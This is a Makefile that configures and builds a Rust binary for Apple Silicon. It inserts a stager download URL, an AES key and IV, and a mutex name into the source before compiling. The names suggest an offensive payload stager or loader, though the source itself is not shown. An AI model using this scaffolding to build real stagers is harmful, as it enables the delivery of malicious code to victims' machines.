DOS = $(shell uname)

setup_min_reqs:
	rustup toolchain install nightly
	rustup component add rust-src --toolchain nightly

build_min_mac_m:
ifeq ($(DOS), Linux)
	sed -i 's/URL_REPLACE_ME/${RSTAGER_URL}/g' src/main.rs
	sed -i 's/AES_KEY_REPLACE_ME/${AES_KEY}/g' src/main.rs
	sed -i 's/AES_IV_REPLACE_ME/${AES_IV}/g' src/main.rs
	sed -i 's/RLOCK/${MUTEX_NAME}/g' src/main.rs
endif
ifeq ($(DOS), Darwin)
	gsed -i 's/URL_REPLACE_ME/${RSTAGER_URL}/g' src/main.rs
	gsed -i 's/AES_KEY_REPLACE_ME/${AES_KEY}/g' src/main.rs
	gsed -i 's/AES_IV_REPLACE_ME/${AES_IV}/g' src/main.rs
	gsed -i 's/RLOCK/${MUTEX_NAME}/g' src/main.rs
endif
	cargo +nightly build -Z build-std=std,panic_abort -Z build-std-features=panic_immediate_abort --target=aarch64-apple-darwin --release
	# git restore ./src/main.rs
